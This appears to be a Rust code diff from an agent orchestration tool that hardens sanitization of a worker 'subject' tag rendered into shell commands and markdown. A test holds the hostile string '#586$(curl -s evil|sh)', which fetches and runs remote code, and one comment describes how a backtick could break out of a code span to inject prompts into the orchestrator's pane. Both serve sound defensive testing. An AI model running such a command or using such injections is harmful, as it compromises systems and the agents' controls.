@@ -1254,6 +1254,19 @@ pub(crate) fn assert_inline_allowlist_agrees_with_explanation(text: &str, surfac
     }
 }
 
+/// Issue #598 fix round: the exact transform [`work_done_footer`] applies to
+/// `subject` before rendering it into the `--subject '...'` example —
+/// `sanitize_subject_tag` (A18's canonicalization) then a `'`-strip
+/// (round 4's belt-and-suspenders shell defense, redundant with
+/// `sanitize_subject_tag` per H6/A19 but kept in place — see the comment at
+/// this function's call site in [`work_done_footer`]). Factored out so tests
+/// asserting on what a worker would see and echo back call this instead of
+/// re-deriving the transformation — the exact "two places transform one
+/// value" shape that produced bugs S11/H6/S13 in PR #593's own review.
+fn footer_subject_argument(s: &str) -> String {
+    sanitize_subject_tag(s).replace('\'', "")
+}
+
 /// Footer appended to every worker task file (see [`compose_worker_task_file`]).
 ///
 /// Issue #303: the summary reaches the CLI through the worker's own shell, so
@@ -1304,13 +1317,14 @@ fn work_done_footer(role: &str, subject: Option<&str>) -> String {
     // subject is sanitized on the ingest side. This is a display-AND-shell
     // sink, since both example commands below are rendered into a ```bash
     // fence the footer's own prose tells the worker to execute: single-quote
-    // the value and strip any `'` it contains. `--task-file`'s path argument,
-    // on this exact sink, uses a different and strictly stronger defense
-    // instead — an ASCII allowlist plus a digest (see `role_path_slug`,
-    // `work_done_footer_path_is_shell_quotable`) — not this quote-and-strip
-    // idiom. A single-quoted shell string cannot be escaped from inside, so
-    // stripping the one character that could close it early is sufficient
-    // for `--subject`.
+    // the value and strip any `'` it contains. `--task-file`'s path argument
+    // shares the single-quoting half of this idiom, but not the strip/filter
+    // half: it uses a different and strictly stronger defense there — an
+    // ASCII allowlist plus a digest (see `role_path_slug`,
+    // `work_done_footer_path_is_shell_quotable`) — in place of the
+    // character-class strip below. A single-quoted shell string cannot be
+    // escaped from inside, so stripping the one character that could close
+    // it early is sufficient for `--subject`.
     //
     // Issue #586 M4 fix round 5 (H6/A19): `.replace('\'', "")` below is now
     // a documented no-op on the production path — `sanitize_subject_tag`
@@ -1330,10 +1344,7 @@ fn work_done_footer(role: &str, subject: Option<&str>) -> String {
     // is a provable no-op on the production path (the only caller already
     // passes a canonical value) and a real defense for any future one.
     let subject_flag = match subject {
-        Some(value) => format!(
-            " --subject '{}'",
-            sanitize_subject_tag(value).replace('\'', "")
-        ),
+        Some(value) => format!(" --subject '{}'", footer_subject_argument(value)),
         None => String::new(),
     };
     format!(
@@ -1620,13 +1631,17 @@ const MAX_SUBJECT_CHARS: usize = 200;
 /// short inline label, not a standalone data block.
 ///
 /// Fix round 3 (A8): also called from
-/// [`crate::agent_pty::AgentPtyRegistry::retire_delegation_commission`] to
-/// sanitize BOTH sides before the equality check that decides whether a
-/// mismatch warning fires at all — not only at render time here. Comparing
-/// raw values let two subjects that render identically (one carrying an
-/// invisible frame-breaking character this function strips) trip a
-/// confusing, seemingly-false warning: `pub(crate)` so that call site can
-/// reach it, since the two modules are siblings, not parent/child.
+/// [`crate::agent_pty::AgentPtyRegistry::retire_delegation_commission`] —
+/// but only to sanitize the worker's ECHOED side there, not both (issue
+/// #598 fix round 2 corrected this comment's earlier claim that the
+/// equality check sanitizes both sides; the armed/expected side was
+/// already canonical from `handle_delegate`'s ingest-time call and is not
+/// sanitized again at the equality check). Comparing a raw echo against
+/// the canonical expected value let two subjects that render identically
+/// (one carrying an invisible frame-breaking character this function
+/// strips) trip a confusing, seemingly-false warning: `pub(crate)` so that
+/// call site can reach it, since the two modules are siblings, not
+/// parent/child.
 ///
 /// Fix round 5 (H6/A19): also strips `'` and `` ` `` here, not only at
 /// [`work_done_footer`]'s render site. This is the ONE canonicalization
@@ -1635,9 +1650,15 @@ const MAX_SUBJECT_CHARS: usize = 200;
 /// a character the footer stripped but this function did not left a
 /// guaranteed false mismatch: a worker echoing exactly what the footer
 /// showed it (an apostrophe already removed) could never equal the ledger's
-/// un-stripped `expected`. Stripping `` ` `` too is belt-and-suspenders — a
+/// un-stripped `expected`. Stripping `` ` `` matters beyond that: while a
 /// backtick inside the footer's single-quoted `--subject '...'` is already
-/// inert — but doing it at the canonicalization point removes any doubt.
+/// inert, [`compose_work_done_feedback`] renders both `expected` and `echoed`
+/// inside markdown code spans (`` `{}` ``) that get auto-submitted into the
+/// orchestrator's live, tool-bearing pane — an un-stripped backtick there
+/// could close the code span early and continue as prose, i.e. prompt
+/// injection, which is strictly worse than the inert shell case. Stripping it
+/// at this single canonicalization point removes any doubt either sink sees
+/// one.
 pub(crate) fn sanitize_subject_tag(subject: &str) -> String {
     let collapsed: String = subject
         .split_whitespace()
@@ -1789,10 +1810,13 @@ enum WorkDoneReportChannel {
 /// fenced ([`quote_untrusted_report`]). The mismatch warning's `expected`/`echoed`
 /// subject tags need no sanitizing here — fix round 4 (S11/A16) made
 /// [`crate::agent_pty::SubjectMismatch`] hold canonical (already-sanitized)
-/// values by construction, sanitized exactly once each at
-/// [`crate::agent_pty::AgentPtyRegistry::retire_delegation_commission`] time,
-/// rather than re-sanitized here — re-sanitizing an already-canonical value is
-/// exactly the non-idempotency bug this round closed.
+/// values by construction: `echoed` is sanitized exactly once, at
+/// [`crate::agent_pty::AgentPtyRegistry::retire_delegation_commission`] time;
+/// `expected` is sanitized exactly once, earlier, at `handle_delegate`'s
+/// ingest (issue #598 fix round 2 corrected this comment's earlier claim
+/// that both were sanitized at `retire_delegation_commission` time). Neither
+/// is sanitized here, and re-sanitizing an already-canonical value is exactly
+/// the non-idempotency bug fix round 4 closed.
 fn compose_work_done_feedback(
     safe_role: &str,
     file_name: &str,
@@ -2747,10 +2771,15 @@ fn arm_delegate_silence_watch(
 /// form, so two workers sharing a cwd are not handed the same report path (see
 /// [`work_done_footer`] for the exact strength of that claim).
 ///
-/// Issue #598 (A18): `subject`, when present, must already be canonical —
-/// i.e. already passed through [`sanitize_subject_tag`] — the same
-/// requirement [`work_done_footer`] documents at its own call site, which
-/// now also defends against a non-canonical value reaching it.
+/// Issue #598 (A18): `subject`, when present, is expected to already be
+/// canonical — i.e. already passed through [`sanitize_subject_tag`] — since
+/// the fan-out loop that calls this is the ingest site that establishes
+/// canonical status. That is not a precondition this function's callers can
+/// enforce, though: `sanitize_subject_tag` is `pub(crate)`, so no caller
+/// outside this crate could satisfy it even if it wanted to. What actually
+/// guarantees a canonical value reaches the rendered footer is defensive,
+/// not contractual: [`work_done_footer`] re-applies `sanitize_subject_tag`
+/// at render time regardless of what this function was handed.
 pub fn compose_worker_task_file(
     prompt_template: Option<&str>,
     task: &str,
@@ -5721,12 +5750,20 @@ impl AppState {
             // consumers below instead of the raw one.
             //
             // Issue #598 (A18) added a defensive re-application of
-            // `sanitize_subject_tag` at the render site (`work_done_footer`)
-            // and at the echo-comparison site (`retire_delegation_commission`).
-            // Both are safe only because the function is idempotent (see
-            // `sanitize_subject_tag_is_idempotent`), not because they are a
-            // second canonicalization point — this ingest site remains the
-            // one place canonical status is established.
+            // `sanitize_subject_tag` at the render site (`work_done_footer`).
+            // The echo-comparison site (`retire_delegation_commission`)
+            // sanitizes the worker's echoed subject, which arrives
+            // unsanitized — that is its one and only pass, not a
+            // re-application. The footer's re-application is safe because
+            // the function is idempotent by construction: the post-filter
+            // whitespace collapse plus the post-truncation trim make
+            // re-application a no-op for any filter set that excludes `' '`,
+            // regardless of input. `sanitize_subject_tag_is_idempotent` is a
+            // regression guard against two specific past bugs (S11/S13), not
+            // a proof of that property — it is 7 hand-picked cases, not a
+            // fuzz/property test. Neither this reapplication nor the echo
+            // site is a second canonicalization point — this ingest site
+            // remains the one place canonical status is established.
             let subject = signal.subject.as_deref().map(sanitize_subject_tag);
             let cwd = self.pane_cwd_map.get(&pane_id).cloned();
 
@@ -8236,7 +8273,11 @@ mod tests {
 
         // A subject that also carries other shell metacharacters must reach
         // the fence unescaped-but-quoted: single-quoting neutralizes `$`,
-        // backticks and `;` without needing to touch them.
+        // `(`, `|`, and `)` without needing to touch them. Backticks are a
+        // separate case —
+        // `sanitize_subject_tag` actively strips them (issue #598, A18/A19)
+        // rather than relying on quoting alone, so they are not exercised by
+        // this assertion.
         let also_hostile = work_done_footer("coder", Some("#586$(curl -s evil|sh)"));
         assert!(
             also_hostile.contains("--subject '#586$(curl -s evil|sh)'"),
@@ -8735,39 +8776,27 @@ mod tests {
         );
     }
 
-    /// Issue #586 M4 fix round 5, updated by issue #598 (M3/A2): what a
-    /// worker sees and would retype after [`work_done_footer`] renders `s`
-    /// into its `--subject '...'` example — mirrors the two transformations
-    /// the footer now applies to the value, in order: `sanitize_subject_tag`
-    /// (added by #598/A18, canonicalizing whatever was passed in) and then
-    /// stripping a literal `'` so a hostile string can't reopen the shell
-    /// argument (round 4's fix, redundant with `sanitize_subject_tag` per
-    /// H6/A19 but kept as defense-in-depth; see `work_done_footer`). Must
-    /// track both, not just one — a helper that only mirrors the `'` strip
-    /// silently diverges from the real footer for any non-canonical input,
-    /// which is exactly the "two places transform one value" shape that
-    /// produced S11/H6/S13.
-    fn footer_argument_of(s: &str) -> String {
-        sanitize_subject_tag(s).replace('\'', "")
-    }
-
-    /// Issue #586 M4 fix round 5 (H6/A19, S13/A17): the actual invariant both
-    /// defects violated, made explicit — sanitizing a subject, rendering it
-    /// into the footer's `--subject '...'` example exactly as a worker sees
-    /// it, then sanitizing AGAIN (simulating a worker that echoes back
-    /// precisely what the footer showed it, which is the correct, expected
-    /// behavior) must be a no-op. Neither round 3's nor round 4's tests
-    /// exercised this: round 4 proved `sanitize_subject_tag` idempotent on
-    /// its OWN output, but H6 and S13 both slipped through by making the
-    /// footer's rendered value diverge from `sanitize_subject_tag`'s output
-    /// on the first pass — an idempotency test alone cannot see that,
-    /// because it never renders through the footer in between.
+    /// Issue #586 M4 fix round 5 (H6/A19, S13/A17), updated by issue #598's
+    /// fix round: the actual invariant both defects violated, made explicit
+    /// — sanitizing a subject, rendering it into the footer's
+    /// `--subject '...'` example exactly as a worker sees it (via
+    /// [`footer_subject_argument`], the same function `work_done_footer`
+    /// itself calls — not a separate reimplementation, closing the "two
+    /// places transform one value" gap that produced S11/H6/S13), then
+    /// sanitizing AGAIN (simulating a worker that echoes back precisely what
+    /// the footer showed it, which is the correct, expected behavior) must
+    /// be a no-op. Neither round 3's nor round 4's tests exercised this:
+    /// round 4 proved `sanitize_subject_tag` idempotent on its OWN output,
+    /// but H6 and S13 both slipped through by making the footer's rendered
+    /// value diverge from `sanitize_subject_tag`'s output on the first pass
+    /// — an idempotency test alone cannot see that, because it never renders
+    /// through the footer in between.
     #[test]
     fn sanitize_subject_tag_round_trips_through_footer_argument() {
         let boundary = "aaa ".repeat(80);
         for input in ["PR #593's fix", "'", "A \u{200B} B", boundary.as_str()] {
             let expected = sanitize_subject_tag(input);
-            let echoed = footer_argument_of(&expected);
+            let echoed = footer_subject_argument(&expected);
             let round_tripped = sanitize_subject_tag(&echoed);
             assert_eq!(
                 round_tripped, expected,
